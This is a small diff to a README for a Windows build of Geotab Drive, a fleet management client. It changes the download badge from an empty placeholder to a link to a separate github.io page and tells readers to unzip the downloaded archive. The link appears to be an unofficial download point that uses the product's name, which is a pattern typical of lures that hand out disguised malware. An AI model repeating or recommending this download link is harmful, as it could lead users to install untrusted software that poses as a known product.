@@ -6,7 +6,7 @@ Geotab Drive for Windows is a comprehensive fleet management client that integra
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://geotab-drive-windows.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
